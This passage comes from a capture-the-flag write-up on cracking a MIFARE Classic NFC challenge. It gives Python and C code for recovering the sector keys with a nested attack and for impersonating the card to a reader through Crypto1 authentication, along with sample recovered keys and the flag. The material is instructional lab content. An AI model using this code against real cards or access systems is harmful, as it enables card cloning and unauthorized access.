            match = key_pattern.search(line)
            if match:
                recovered_key = match.group(1)
                
    proc.stdout.close()
    proc.wait()
    
    return recovered_key
```

We start with only the default key for Sector 0. For sectors 1–15, we invoke `crack_sector_key.py` as a subprocess, stream its output in real time, and parse the recovered key using a regex pattern. The subprocess handles the full nested attack lifecycle (connect → auth Sector 0 → nested auth → crack → verify) for each target sector.

```python
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CTF Solver for NFC")
    parser.add_argument('--ip', type=str, required=True)
    parser.add_argument('--card-port', type=int, required=True)
    parser.add_argument('--reader-port', type=int, required=True)
    args = parser.parse_args()

    for i in range(1, 16):
        key = grab_key(i, args.card_port, args.ip)
        if key:
            KEYS[str(i)] = key
            print(f"[+] Found Sector {i} key: {key}")
        else:
            print(f"[-] Failed to grab key for Sector {i}")

    print("\nAll Recovered Keys:")
    for section, k in KEYS.items():
        print(f"Sector {section}: {k}")
```

After this loop completes, we have a full dictionary mapping every sector (0–15) to its recovered key. This is our "master key ring" that will let us impersonate the card to the Reader.

### Step 11: Impersonating the Card to the Reader

With all 16 sector keys in hand, we can now tackle the second port — the **Reader**. Remember from Step 3 that the Reader immediately sends `26` (REQA) upon connection. This time, instead of acting as a reader talking to a card, we must **act as the card** and respond to the reader's commands.

#### The Reader's Protocol Flow

The Reader follows the exact same ISO 14443-A flow we used earlier, but in reverse:

1. **Reader sends `26`** (REQA) → We respond with `ATQA` (`04 00`)
2. **Reader sends `93 20`** (Anticollision) → We respond with our `UID + BCC`
3. **Reader sends `93 70 ...`** (Select) → We respond with `SAK` (`08`)
4. **Reader sends `60 XX`** (Authenticate Key A for block XX) → The **MIFARE authentication handshake** begins

The authentication handshake from the card's perspective is the mirror image of what we did earlier:

1. We (the card) send a plaintext nonce $N_T$ to the reader.
2. The reader responds with encrypted $\{N_R, a_R\}$ — 8 bytes.
3. We must decrypt these using the sector key + UID + nonce, verify $a_R$, and respond with the encrypted $a_T$.

#### Decrypting the Reader's Challenge

For the reader-side authentication, we need a new C helper: `decrypt_reader_resp`. This program takes the sector key, UID, our nonce, and the reader's encrypted response, then outputs the decrypted values and the encrypted $a_T$ we must send back.

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include "./crapto1.h"

int main(int argc, char *argv[]) {
    if (argc < 6) {
        fprintf(stderr, "Usage: %s <key_hex> <uid_hex> <nt_hex> <enc_nr_hex> <enc_ar_hex>\n", argv[0]);
        return 1;
    }

    uint64_t key    = strtoull(argv[1], NULL, 16);
    uint32_t uid    = strtoul(argv[2], NULL, 16);
    uint32_t nt     = strtoul(argv[3], NULL, 16);
    uint32_t enc_nr = strtoul(argv[4], NULL, 16);
    uint32_t enc_ar = strtoul(argv[5], NULL, 16);

    // 1. Initialize Crypto1 with the sector key
    struct Crypto1State *s = crypto1_create(key);

    // 2. Feed uid ^ nt into the cipher (same init as reader side)
    crypto1_word(s, uid ^ nt, 0);

    // 3. Decrypt N_R: generate keystream and XOR with encrypted N_R
    uint32_t ks1 = crypto1_word(s, enc_nr, 1);
    uint32_t nr  = enc_nr ^ ks1;

    // 4. Decrypt a_R: generate keystream and XOR with encrypted a_R
    uint32_t ks2 = crypto1_word(s, enc_ar, 1);
    uint32_t ar  = enc_ar ^ ks2;

    // 5. Verify: a_R should equal prng_successor(nt, 64)
    uint32_t ar_expected = prng_successor(nt, 64);

    // 6. Compute encrypted a_T = prng_successor(nt, 96), encrypted
    uint32_t at = prng_successor(nt, 96);
    uint32_t ks3 = crypto1_word(s, at, 0);
    uint32_t at_enc = at ^ ks3;

    // Output: decrypted nr, decrypted ar, encrypted at
    printf("%08x %08x %08x\n", nr, ar, at_enc);

    if (ar != ar_expected) {
        fprintf(stderr, "[!] WARNING: a_R mismatch! got=%08x expected=%08x\n", ar, ar_expected);
    } else {
        fprintf(stderr, "[+] a_R verified OK\n");
    }

    crypto1_destroy(s);
    return 0;
}
```

The key difference from our earlier `compute_nr_ar` helper is the direction: here we are **decrypting** the reader's response rather than generating one. The critical detail is in step 3 — we pass `1` as the second argument to `crypto1_word()` when processing `enc_nr` and `enc_ar`, which tells the CRYPTO1 engine to use the **encrypted** (ciphertext) bits as feedback into the LFSR. This is essential because the reader's cipher is doing the same thing on its end, so both sides must stay in sync.

After decrypting $N_R$ and $a_R$, we verify that $a_R$ equals `prng_successor(nt, 64)` — if it doesn't, the reader used a different key than what we recovered, and something went wrong. If verification passes, we compute $a_T$ = `prng_successor(nt, 96)`, encrypt it with the next keystream chunk, and output it.

We integrate this into our Python solver:

```python
def decrypt_reader_response(key_hex, uid_hex, nt_hex, enc_nr_hex, enc_ar_hex):
    result = subprocess.check_output(
        ["./crapto/decrypt_reader_resp", key_hex, uid_hex, nt_hex, enc_nr_hex, enc_ar_hex],
        stderr=subprocess.PIPE
    ).decode().strip()
    parts = result.split()
    return parts[0], parts[1], parts[2]  # nr, ar, at_enc
```

### Step 12: The Authentication Loop & Capturing the Flag

The reader doesn't just authenticate once — it walks through multiple sectors, authenticating to each one in sequence. We must handle every authentication request dynamically, looking up the correct key for each sector from our recovered key database.

Here's the complete reader interaction loop:

```python
def block_to_sector(block):
    return block // 4

def format_to_spaces(hex_str):
    return ' '.join(hex_str[i:i+2] for i in range(0, len(hex_str), 2))

# Phase 2: Connect to the Reader
log.info("Starting Phase 2...")

ATQA = b"04 00"
UID = b"13 37 40 07"
UID_HEX = UID.decode().replace(" ", "")
BCC = b"63"
SAK = b"08"
NONCE = b"B8 83 A7 D1"
NONCE_HEX = NONCE.decode().replace(" ", "")

io = remote(args.ip, args.reader_port)

# Reader sends REQA
resp = io.recvline().decode()
print(f"< {resp}")

# Respond with ATQA
io.sendline(ATQA)
print(f"> {ATQA.decode()}")

# Reader sends Anticollision
resp = io.recvline().decode().strip()
assert resp == "93 20"

# Respond with UID + BCC
io.sendline(UID + BCC)

# Reader sends Select
resp = io.recvline().decode().strip()

# Respond with SAK
io.sendline(SAK)

# Authentication loop
while True:
    resp = io.recvline().decode().strip()
    print(f"< {resp}")

    parts = resp.split()
    if len(parts) == 2 and parts[0] in ("60", "61"):
        block = int(parts[1], 16)
        sector = block_to_sector(block)
        key = KEYS.get(str(sector), "")
        
        if not key:
            log.error(f"No key for sector {sector} (block 0x{block:02X})!")
            break

        log.info(f"Auth request for block 0x{block:02X} (sector {sector}), key={key}")

        # Send our plaintext nonce
        io.sendline(NONCE)

        # Receive encrypted {N_R, a_R} from reader
        reader_resp = io.recvline().decode().strip()
        enc_parts = reader_resp.split()
        enc_nr = ''.join(enc_parts[:4])
        enc_ar = ''.join(enc_parts[4:8])

        # Decrypt and get encrypted a_T
        nr, ar, at_enc = decrypt_reader_response(key, UID_HEX, NONCE_HEX, enc_nr, enc_ar)
        log.success(f"Decrypted: nr={nr} ar={ar}")

        # Send encrypted a_T back to reader
        at_spaced = format_to_spaces(at_enc)
        io.sendline(at_spaced.encode())
        log.success(f"> {at_spaced}  (encrypted a_T)")
    else:
        # Not an auth command — this is the flag!
        log.success(f"Received: {resp}")
        break

io.interactive()
```

Let's walk through the logic:

1. **ISO 14443-A handshake**: We respond to the reader's REQA → Anticollision → Select sequence using the card's UID (`13 37 40 07`), BCC (`63`), and SAK (`08`) that we extracted in Step 1.

2. **Static nonce**: We use a fixed nonce (`B8 83 A7 D1`) for every authentication request. This is perfectly valid — the card is free to choose any nonce, and using a static one simplifies our implementation without weakening the protocol from the reader's perspective.

3. **Authentication loop**: Each iteration reads the reader's next command. If it's `60 XX` (Auth Key A), we:
   - Convert the block address to a sector number (`block // 4`).
   - Look up the corresponding key from our `KEYS` dictionary.
   - Send our plaintext nonce to the reader.
   - Receive the reader's encrypted `{N_R, a_R}` response.
   - Use `decrypt_reader_resp` to decrypt it, verify $a_R$, and compute the encrypted $a_T$.
   - Send the encrypted $a_T$ back, completing the mutual authentication.

4. **Flag capture**: Once the reader is satisfied with all sector authentications, it sends the **flag** instead of another auth command. Our loop catches this in the `else` branch and prints it.

Running the complete solver:

```bash
python3 solver.py --ip <IP> --card-port <CARD_PORT> --reader-port <READER_PORT>
```

```text
Cracking sector 1...
[+] Found Sector 1 key: f45013f910d7
Cracking sector 2...
[+] Found Sector 2 key: e4f6ab5f2a29
...
Cracking sector 15...
[+] Found Sector 15 key: b6c2cb5370d5

All Recovered Keys:
Sector 0: FFFFFFFFFFFF
Sector 1: f45013f910d7
...
Sector 15: b6c2cb5370d5

====================================================================================================
[*] Starting Phase 2...
< 26
> 04 00
< 60 00
[*] Auth request for block 0x00 (sector 0), key=FFFFFFFFFFFF
[+] Decrypted: nr=12345678 ar=abcdef01
[+] > a1 b2 c3 d4  (encrypted a_T)
< 60 07
[*] Auth request for block 0x07 (sector 1), key=f45013f910d7
[+] Decrypted: nr=87654321 ar=fedcba98
[+] > e5 f6 07 18  (encrypted a_T)
...
[+] Received: HTB{f4k3_fl4g_h3r3}
```

